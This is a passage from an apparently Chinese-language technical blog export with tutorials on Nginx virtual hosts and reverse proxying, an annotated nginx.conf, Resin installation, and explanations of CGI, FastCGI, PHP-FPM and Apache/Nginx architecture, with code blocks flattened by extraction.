/usr/local/nginx/conf/vhostvim defaule.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入配置： 12345678server&#123; listen 80 default_server; server_name localhost; index index.html index.htm index.php; root /tmp/tmp; deny all;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;说明：在之前的 nginx.conf 中就已经定义了 include 语句，意思是它会包含一些配置，在这里它会把 /usr/local/nginx/conf/vhosts/ 目录下的所有 *.conf 文件加载。所以，在这个目录下定义了一个 default.conf 文件，在这里会发现 listen 80 后面还有一个关键词叫做 “default_server”，这个就是用来标记它是默认虚拟主机的。使用 deny all 限制了该虚拟主机禁止被任何人访问。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建默认主机下定义的文件夹，不然会报错 1mkdir /tmp/tmp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果有新的虚拟主机如 123.com 则编辑配置文件 123.conf 1vim 123.conf &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入内容： 123456789101112131415server&#123; listen 80; server_name 123.com; index index.html index.htm index.php; root /data/www; location ~ \.php$ &#123; include fastcgi_params; fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www$fastcgi_script_name; &#125;&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看监听端口 1netstat -lnp &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;监听的是 ip+prot 的形式，所以配置文件需要更改为 12345678910111213141516server&#123; listen 80; server_name 123.com; index index.html index.htm index.php; root /data/www; location ~ \.php$ &#123; include fastcgi_params; #fastcgi_pass unix:/tmp/php-fcgi.sock; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www$fastcgi_script_name; &#125;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx配置文件nginx.conf中文详解]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F8.%20Nginx%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6nginx.conf%E4%B8%AD%E6%96%87%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[Nginx配置文件nginx.conf中文详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132#定义Nginx运行的用户和用户组user www www;#nginx进程数，建议设置为等于CPU总核心数。worker_processes 8;#全局错误日志定义类型，[ debug | info | notice | warn | error | crit ]error_log /var/log/nginx/error.log info;#进程文件pid /var/run/nginx.pid;#一个nginx进程打开的最多文件描述符数目，理论值应该是最多打开文件数（系统的值ulimit -n）与nginx进程数相除，但是nginx分配请求并不均匀，所以建议与ulimit -n的值保持一致。worker_rlimit_nofile 65535;#工作模式与连接数上限events&#123;#参考事件模型，use [ kqueue | rtsig | epoll | /dev/poll | select | poll ]; epoll模型是Linux 2.6以上版本内核中的高性能网络I/O模型，如果跑在FreeBSD上面，就用kqueue模型。use epoll;#单个进程最大连接数（最大连接数=连接数*进程数）worker_connections 65535;&#125;#设定http服务器http&#123;include mime.types; #文件扩展名与文件类型映射表default_type application/octet-stream; #默认文件类型#charset utf-8; #默认编码server_names_hash_bucket_size 128; #服务器名字的hash表大小client_header_buffer_size 32k; #上传文件大小限制large_client_header_buffers 4 64k; #设定请求缓client_max_body_size 8m; #设定请求缓sendfile on; #开启高效文件传输模式，sendfile指令指定nginx是否调用sendfile函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘IO重负载应用，可设置为off，以平衡磁盘与网络I/O处理速度，降低系统的负载。注意：如果图片显示不正常把这个改成off。autoindex on; #开启目录列表访问，合适下载服务器，默认关闭。tcp_nopush on; #防止网络阻塞tcp_nodelay on; #防止网络阻塞keepalive_timeout 120; #长连接超时时间，单位是秒#FastCGI相关参数是为了改善网站的性能：减少资源占用，提高访问速度。下面参数看字面意思都能理解。fastcgi_connect_timeout 300;fastcgi_send_timeout 300;fastcgi_read_timeout 300;fastcgi_buffer_size 64k;fastcgi_buffers 4 64k;fastcgi_busy_buffers_size 128k;fastcgi_temp_file_write_size 128k;#gzip模块设置gzip on; #开启gzip压缩输出gzip_min_length 1k; #最小压缩文件大小gzip_buffers 4 16k; #压缩缓冲区gzip_http_version 1.0; #压缩版本（默认1.1，前端如果是squid2.5请使用1.0）gzip_comp_level 2; #压缩等级gzip_types text/plain application/x-javascript text/css application/xml;#压缩类型，默认就已经包含text/html，所以下面就不用再写了，写上去也不会有问题，但是会有一个warn。gzip_vary on;#limit_zone crawler $binary_remote_addr 10m; #开启限制IP连接数的时候需要使用upstream blog.ha97.com &#123;#upstream的负载均衡，weight是权重，可以根据机器配置定义权重。weigth参数表示权值，权值越高被分配到的几率越大。server 192.168.80.121:80 weight=3;server 192.168.80.122:80 weight=2;server 192.168.80.123:80 weight=3;&#125;#虚拟主机的配置server&#123;#监听端口listen 80;#域名可以有多个，用空格隔开server_name www.ha97.com ha97.com;index index.html index.htm index.php;root /data/www/ha97;location ~ .*\.(php|php5)?$&#123;fastcgi_pass 127.0.0.1:9000;fastcgi_index index.php;include fastcgi.conf;&#125;#图片缓存时间设置location ~ .*\.(gif|jpg|jpeg|png|bmp|swf)$&#123;expires 10d;&#125;#JS和CSS缓存时间设置location ~ .*\.(js|css)?$&#123;expires 1h;&#125;#日志格式设定log_format access '$remote_addr - $remote_user [$time_local] "$request" ''$status $body_bytes_sent "$http_referer" ''"$http_user_agent" $http_x_forwarded_for';#定义本虚拟主机的访问日志access_log /var/log/nginx/ha97access.log access;#对 "/" 启用反向代理location / &#123;proxy_pass http://127.0.0.1:88;proxy_redirect off;proxy_set_header X-Real-IP $remote_addr;#后端的Web服务器可以通过X-Forwarded-For获取用户真实IPproxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;#以下是一些反向代理的配置，可选。proxy_set_header Host $host;client_max_body_size 10m; #允许客户端请求的最大单文件字节数client_body_buffer_size 128k; #缓冲区代理缓冲用户端请求的最大字节数，proxy_connect_timeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)proxy_send_timeout 90; #后端服务器数据回传时间(代理发送超时)proxy_read_timeout 90; #连接成功后，后端服务器响应时间(代理接收超时)proxy_buffer_size 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小proxy_buffers 4 32k; #proxy_buffers缓冲区，网页平均在32k以下的设置proxy_busy_buffers_size 64k; #高负荷下缓冲大小（proxy_buffers*2）proxy_temp_file_write_size 64k;#设定缓存文件夹大小，大于这个值，将从upstream服务器传&#125;#设定查看Nginx状态的地址location /NginxStatus &#123;stub_status on;access_log on;auth_basic "NginxStatus";auth_basic_user_file conf/htpasswd;#htpasswd文件的内容可以用apache提供的htpasswd工具来产生。&#125;#本地动静分离反向代理配置#所有jsp的页面均交由tomcat或resin处理location ~ .(jsp|jspx|do)?$ &#123;proxy_set_header Host $host;proxy_set_header X-Real-IP $remote_addr;proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;proxy_pass http://127.0.0.1:8080;&#125;#所有静态文件由nginx直接读取不经过tomcat或resinlocation ~ .*.(htm|html|gif|jpg|jpeg|png|bmp|swf|ioc|rar|zip|txt|flv|mid|doc|ppt|pdf|xls|mp3|wma)$&#123; expires 15d; &#125;location ~ .*.(js|css)?$&#123; expires 1h; &#125;&#125;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[resin安装与配置]]></title>
    <url>%2F2017%2F08%2F10%2FResin%2F1.%20resin%E5%AE%89%E8%A3%85%E4%B8%8E%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[resin安装与配置&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;resin 同样也需要 jdk 的支持，所以第一步也是安装 jdk 。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;resin官方网站 ，它分两个版本，resin 是开源的，另外一个 resinpro 为商业版本。 123[root@192 src]# wget http://caucho.com/download/resin-4.0.51.tar.gz[root@192 src]# tar zxvf resin-4.0.51.tar.gz [root@192 src]# cd resin-4.0.51 12./configure --prefix=/usr/local/resin --with-java-home=/usr/local/jdk1.8.0_111make &amp;&amp; make install 1[root@192 resin-4.0.51]# /etc/init.d/resin start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面简单配置： 12[root@192 resin-4.0.51]# cd /usr/local/resin/conf/[root@192 conf]# vim resin.xml &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;resin 的配置文件和 tomcat 的很像，基本结构为： 123&lt;cluster id="app"&gt;&lt;host&gt;&lt;/host&gt;&lt;/cluster&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;其中虚拟主机配置就在 里配置 12345[root@192 conf]# vim resin.xml&lt;host id="www.123.com" root-directory="."&gt; &lt;web-app id="/" root-directory="/tmp/resin"&gt;&lt;/host&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注意，这里要放在 下边 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;创建文件夹，并重启 resin 12345[root@192 conf]# mkdir /tmp/resin[root@192 conf]# service resin stopStopping resin: .[root@192 conf]# service resin startStarting resin: . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后编辑一个测试文件 1[root@192 conf]# vim /tmp/resin/222.jsp 12345&lt;html&gt;&lt;body&gt;&lt;center&gt; Now time is: &lt;%=new java.util.Date()%&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;测试 123456[root@192 conf]# curl -x127.0.0.1:80 www.123.com/222.jsp&lt;html&gt;&lt;body&gt;&lt;center&gt; Now time is: Wed Apr 05 13:30:44 CST 2017 &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改监听端口，需编辑配置文件： 1[root@192 conf]# vim resin.properties &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改为 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重启服务 1234[root@192 conf]# service resin stopStopping resin: .[root@192 conf]# service resin startStarting resin: . &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;登录本地 IP 就能访问 resin 的默认页面]]></content>
      <tags>
        <tag>Resin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx代理--根据访问的目录来区分后端的web]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F25.%20nginx%E4%BB%A3%E7%90%86--%E6%A0%B9%E6%8D%AE%E8%AE%BF%E9%97%AE%E7%9A%84%E7%9B%AE%E5%BD%95%E6%9D%A5%E5%8C%BA%E5%88%86%E5%90%8E%E7%AB%AF%E7%9A%84web%2F</url>
    <content type="text"><![CDATA[nginx代理–根据访问的目录来区分后端的web&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求： 当请求的目录是 /aaa/ 则把请求发送到机器a，当请求的目录为/bbb/则把请求发送到机器b，除了目录/aaa/与目录/bbb/外，其他的请求发送到机器b &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;的配置文件内容为： 123456789101112131415161718192021222324252627282930313233upstream aaa.com&#123; server 192.168.111.6;&#125; upstream bbb.com&#123; server 192.168.111.20;&#125;server &#123; listen 80; server_name li.com; location /aaa/ &#123; proxy_pass http://aaa.com/aaa/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;location /bbb/ &#123; proxy_pass http://bbb.com/bbb/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;location / &#123; proxy_pass http://bbb.com/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; &#125; &#160;&#160;&#160;&#160;&#160;&#160;1. 以上配置文件中的 aaa.com 以及 bbb.com 都是自定义的，随便写。 upstream 中的server 可以写多个，例如 123456upstream aaa.com &#123; server 192.168.111.6; server 192.168.111.4; server 192.168.111.5;&#125; proxy_pass http://aaa.com/aaa/ 这里必须要加这个目录，不然就访问到根目录了。 实际上，上述配置文件中， localtion /bbb/ 部分是可以省略掉的，因为后边的 location / 已经包含了/bbb/，所以即使我们不去定义 localtion /bbb/ 也是会访问到 bbb.com 的。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[概念了解：CGI，FastCGI，PHP-CGI与PHP-FPM]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F6.%20%E6%A6%82%E5%BF%B5%E4%BA%86%E8%A7%A3%EF%BC%9ACGI%EF%BC%8CFastCGI%EF%BC%8CPHP-CGI%E4%B8%8EPHP-FPM%2F</url>
    <content type="text"><![CDATA[概念了解：CGI，FastCGI，PHP-CGI与PHP-FPMCGI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CGI全称是“公共网关接口”(Common Gateway Interface)，HTTP服务器与你的或其它机器上的程序进行“交谈”的一种工具，其程序须运行在网络服务器上。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php,perl,tcl等。 FastCGI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次（这是CGI最为人诟病的fork-and-execute 模式）。它还支持分布式的运算，即 FastCGI 程序可以在网站服务器以外的主机上执行并且接受来自其它网站服务器来的请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FastCGI是语言无关的、可伸缩架构的CGI开放扩展，其主要行为是将CGI解释器进程保持在内存中并因此获得较高的性能。众所周知，CGI解释器的反复加载是CGI性能低下的主要原因，如果CGI解释器保持在内存中并接受FastCGI进程管理器调度，则可以提供良好的性能、伸缩性、Fail- Over特性等等。 FastCGI特点 FastCGI具有语言无关性. FastCGI在进程中的应用程序，独立于核心web服务器运行，提供了一个比API更安全的环境。APIs把应用程序的代码与核心的web服务器链接在一起，这意味着在一个错误的API的应用程序可能会损坏其他应用程序或核心服务器。 恶意的API的应用程序代码甚至可以窃取另一个应用程序或核心服务器的密钥。 FastCGI技术目前支持语言有：C/C++、Java、Perl、Tcl、Python、SmallTalk、Ruby等。相关模块在Apache, ISS, Lighttpd等流行的服务器上也是可用的。 FastCGI的不依赖于任何Web服务器的内部架构，因此即使服务器技术的变化, FastCGI依然稳定不变。 FastCGI的工作原理 Web Server启动时载入FastCGI进程管理器（IIS ISAPI或Apache Module) FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可见多个php-cgi)并等待来自Web Server的连接。 当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。 FastCGI子进程完成处理后将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在上述情况中，你可以想象CGI通常有多慢。每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展并重初始化全部数据结构。使用FastCGI，所有这些都只在进程启动时发生一次。一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。 FastCGI的不足&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;因为是多进程，所以比CGI多线程消耗更多的服务器内存，PHP-CGI解释器每进程消耗7至25兆内存，将这个数字乘以50或100就是很大的内存数。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx 0.8.46+PHP 5.2.14(FastCGI)服务器在3万并发连接下，开启的10个Nginx进程消耗150M内存（15M10=150M），开启的64个php-cgi进程消耗1280M内存 （20M64=1280M），加上系统自身消耗的内存，总共消耗不到2GB内存。如果服务器内存 较小，完全可以只开启25个php-cgi进程，这样php-cgi消耗的总内存数才500M。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;上面的数据摘自Nginx 0.8.x + PHP 5.2.13(FastCGI)搭建胜过Apache十倍的Web服务器(第6版) PHP-CGI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP-CGI是PHP自带的FastCGI管理器。 PHP-CGI的不足： php-cgi变更php.ini配置后需重启php-cgi才能让新的php-ini生效，不可以平滑重启。 直接杀死php-cgi进程，php就不能运行了。(PHP-FPM和Spawn-FCGI就没有这个问题，守护进程会平滑从新生成新的子进程。） PHP-FPM&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP-FPM是一个PHP FastCGI管理器，是只用于PHP的，可以下载下载得到。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP-FPM其实是PHP源代码的一个补丁，旨在将FastCGI进程管理整合进PHP包中。必须将它patch到你的PHP源代码中，在编译安装PHP后才可以使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;现在我们可以在最新的PHP 5.3.2的源码树里下载得到直接整合了PHP-FPM的分支，据说下个版本会融合进PHP的主分支去。相对Spawn-FCGI，PHP-FPM在CPU和内存方面的控制都更胜一筹，而且前者很容易崩溃，必须用crontab进行监控，而PHP-FPM则没有这种烦恼。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP5.3.3已经集成php-fpm了，不再是第三方的包了。PHP-FPM提供了更好的PHP进程管理方式，可以有效控制内存和进程、可以平滑重载PHP配置，比spawn-fcgi具有更多有点，所以被PHP官方收录了。在./configure的时候带 –enable-fpm参数即可开启PHP-FPM。 Spawn-FCGI&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spawn-FCGI是一个通用的FastCGI管理服务器，它是lighttpd中的一部份，很多人都用Lighttpd的Spawn-FCGI进行FastCGI模式下的管理工作，不过有不少缺点。而PHP-FPM的出现多少缓解了一些问题，但PHP-FPM有个缺点就是要重新编译，这对于一些已经运行的环境可能有不小的风险(refer)，在php 5.3.3中可以直接使用PHP-FPM了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spawn-FCGI目前已经独成为一个项目，更加稳定一些，也给很多Web 站点的配置带来便利。已经有不少站点将它与nginx搭配来解决动态网页。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;最新的lighttpd也没有包含这一块了，但可以在以前版本中找到它。在lighttpd-1.4.15版本中就包含了 ，Spawn-FCGI的下 载地址，最新版本Spawn-FCGI的下 载地址。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注：最新的Spawn-FCGI可以到lighttpd.net网站搜索“Spawn-FCGI”找到它的最新版本发布地址。 PHP-FPM与spawn-CGI对比&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;PHP-FPM的使用非常方便，配置都是在PHP-FPM.ini的文件内，而启动、重启都可以从php/sbin/PHP-FPM中进行。更方便的是修改php.ini后可以直接使用PHP-FPM reload进行加载，无需杀掉进程就可以完成php.ini的修改加载 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;结果显示使用PHP-FPM可以使php有不小的性能提升。PHP-FPM控制的进程cpu回收的速度比较慢,内存分配的很均匀。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Spawn-FCGI控制的进程CPU下降的很快，而内存分配的比较不均匀。有很多进程似乎未分配到，而另外一些却占用很高。可能是由于进程任务分配的不均匀导致的。而这也导致了总体响应速度的下降。而PHP-FPM合理的分配，导致总体响应的提到以及任务的平均。]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[nginx针对请求的uri来代理]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F26.%20nginx%E9%92%88%E5%AF%B9%E8%AF%B7%E6%B1%82%E7%9A%84uri%E6%9D%A5%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[nginx针对请求的uri来代理&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;场景：1台nginx去代理4台apache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;需求：根据不同的请求uri 代理到不同的apache &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;nginx的配置文件为： 1234567891011121314151617181920212223242526upstream aa.com &#123; server 192.168.0.121; server 192.168.0.122; &#125;upstream bb.com &#123; server 192.168.0.123; server 192.168.0.124; &#125;server &#123; listen 80; server_name www.abc.com; location ~ aa.php &#123; proxy_pass http://aa.com/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125; location ~ bb.php &#123; proxy_pass http://bb.com/; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; &#125;&#125;]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入理解PHP之：Nginx 与 FPM 的工作机制]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F28.%20%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E4%B9%8B%EF%BC%9ANginx%20%E4%B8%8E%20FPM%20%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%9C%BA%E5%88%B6%2F</url>
    <content type="text"><![CDATA[深入理解PHP之：Nginx 与 FPM 的工作机制&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;网络上有很多关于如何配置 Nginx + FPM 的文章，但它们更多从操作的角度出发，告诉我们怎么做，但却没有告诉我们为什么要这么做，本文从 Nginx 与 FPM 的工作机制出发，探讨配置背后的原理，让我们真正理解 Nginx 与 PHP 是如何协同工作的。要说 Nginx 与 PHP 是如何协同工作的，首先得说 CGI (Common Gateway Interface) 和 FastCGI 这两个协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;CGI 是 Web Server 与后台语言交互的协议，有了这个协议，开发者可以使用任何语言处理 Web Server 发来的请求，动态的生成内容。但 CGI 有一个致命的缺点，那就是每处理一个请求都需要 fork 一个全新的进程，随着 Web 的兴起，高并发越来越成为常态， 这样低效的方式明显不能满足需求。就这样，FastCGI 诞生了，CGI 很快就退出了历史的 舞台。FastCGI，顾名思义为更快的 CGI，它允许在一个进程内处理多个请求，而不是一个 请求处理完毕就直接结束进程，性能上有了很大的提高。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;至于 FPM (FastCGI Process Manager)，它是 FastCGI 的实现，任何实现了 FastCGI 协议的 Web Server 都能够与之通信。FPM 之于标准的 FastCGI，也提供了一些增强功能，具体可以参考官方文档：PHP: FPM Installation。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FPM 是一个 PHP 进程管理器，包含 master 进程和 worker 进程两种进程：master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个 (具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方，下图是我本机上 fpm 的进程情况，1一个 master 进程，3个 worker 进程： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从 FPM 接收到请求，到处理完毕，其具体的流程如下： FPM 的 master 进程接收到请求 master 进程根据配置指派特定的 worker 进程进行请求处理，如果没有可用进程，返回错误，这也是我们配合 Nginx 遇到502错误比较多的原因。 worker 进程处理请求，如果超时，返回504错误 请求处理结束，返回结果 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FPM 从接收到处理请求的流程就是这样了，那么 Nginx 又是如何发送请求给 fpm 的呢？这就需要从 Nginx 层面来说明了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;我们知道，Nginx 不仅仅是一个 Web 服务器，也是一个功能强大的 Proxy 服务器，除了进行 http 请求的代理，也可以进行许多其他协议请求的代理，包括本文与 fpm 相关的 fastcgi 协议。为了能够使 Nginx 理解 fastcgi 协议，Nginx 提供了 fastcgi 模块来将 http 请求映射为对应的 fastcgi 请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Nginx 的 fastcgi 模块提供了 fastcgi_param 指令来主要处理这些映射关系，下面 Ubuntu 下 Nginx 的一个配置文件，其主要完成的工作是将 Nginx 中的变量翻译成 PHP 中能够理解的变量。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;除此之外，非常重要的就是 fastcgi_pass 指令了，这个指令用于指定 fpm 进程监听的地址，Nginx 会把所有的 php 请求翻译成 fastcgi 请求之后再发送到这个地址。下面一个简单的可以工作的 Nginx 配置文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在这个配置文件中，我们新建了一个虚拟主机，监听在 80 端口，Web 根目录为 /home/rf/projects/wordpress。然后我们通过 location 指令，将所有的以 .php 结尾的请求都交给 fastcgi 模块处理，从而把所有的 php 请求都交给了 fpm 处理，从而完成 Nginx 到 fpm 的闭环。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如此以来，Nginx 与 FPM 通信的整个流程应该比较清晰了吧。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看php-fpm.conf的配置文件 1234567891011[root@192 etc]# cat php-fpm.conf |grep -v '^;' |grep -v '^$' |grep -v "^ "[global][www]user = php-fpmgroup = php-fpmlisten = 127.0.0.1:9000pm = dynamicpm.max_children = 5pm.start_servers = 2pm.min_spare_servers = 1pm.max_spare_servers = 3 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;慢执行日志 12345slowlog = /path/to/slow.logrequest_slowlog_timeout = 1open_basedirphp_admin_value[open_basedir]=/data/www/:/tmp/]]></content>
      <tags>
        <tag>Nginx</tag>
        <tag>LNMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Apache和Nginx运行原理解析]]></title>
    <url>%2F2017%2F08%2F10%2FNginx%2F3.%20Apache%E5%92%8CNginx%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90%2F</url>
    <content type="text"><![CDATA[Apache和Nginx运行原理解析Web服务器&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Web服务器也称为WWW(WORLD WIDE WEB)服务器，主要功能是提供网上信息浏览服务。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;应用层使用HTTP协议。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;HTML文档格式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器统一资源定位器(URL)。&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Web服务器常常以B/S（Browser/Server）方式提供服务。浏览器和服务器的交互方式如下： 123456789GET /index.php HTTP/1.1+---------------+ +----------------+| +-------------------&gt; || Browser | | Server || &lt;-------------------+ |+---------------+ +----------------+ HTTP/1.1 200 OK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器向服务器发出HTTP请求(Request)。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;服务器收到浏览器的请求数据，经过分析处理，向浏览器输出响应数据（Response）。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;浏览器收到服务器的响应数据，经过分析处理，将最终结果显示在浏览器中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache和Nginx都属于Web服务器，两者都实现了HTTP 1.1协议。 Apache 概述&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache HTTP Server是Apache软件基金会的一个开放源代码的网页服务器，可以在大多数计算机操作系统中运行，由于其跨平台和安全性。被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl／Python等解释器编译到服务器中。 – 维基百科 Apache组件&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Apache是基于模块化设计的，它的核心代码并不多，大多数的功能都被分散到各个模块中，各个模块在系统启动的时候按需载入。 12345678910111213141516"text"&gt; +----------+ +- | Module | -----------------+ | +----------+ | | +------------++-----------+ Apache HTTPD | php module || Module | +------------++-----------+ +----------+| +----------+-------- | MPM |+ | +----+---+-+ +-v-----------+ | | | ARP &lt;--+ | +------+------+ | | | +---------------v-------------v--+ | Operating System | +--------------------------------+ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;MPM（Multi -Processing Modules，多重处理模块）是Apache的核心组件之一，Apache通过MPM来使用操作系统的资源，对进程和线程池进行管理。Apache为了能够获得最好的运行性能，针对不同的平台 (Unix/Linux、Window)做了优化，为不同的平台提供了不同的MPM，用户可以根据实际情况进行选择，其中最常使用的MPM有 prefork和worker两种。至于您的服务器正以哪种方式运行，取决于安装Apache过程中指定的MPM编译参数,在X系统上默认的编译参数为 prefork。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;由于大多数的Unix都不支持真正的线程，所以采用了预派生子进程(prefork)方式，象Windows或者Solaris这些支持 线程的平台，基于多进程多线程混合的worker模式是一种不错的选择。Apache中还有一个重要的组件就是APR（Apache portable Runtime Library），即Apache可移植运行库，它是一个对操作系统调用的抽象库，用来实现Apache内部组件对操作系统的使用，提高系统的可移植性。 Apache对于php的解析，就是通过众多Module中的php Module来完成的。 Apache生命周期12345678910111213141516171819202122"text"&gt; +--------------------------------------------------------------+ | +---------------------+ 启动阶段 | | | 系统启动, 配置 | | | +----------+----------+ | | | | | +----------v----------+ | | | 模块的初始化 | | | +-+--------+--------+-+ | | | | | | | +-------------+ | +------v-------+| +--------------+ | | | 子进程初始化 |&lt;+ | 子进程初始化 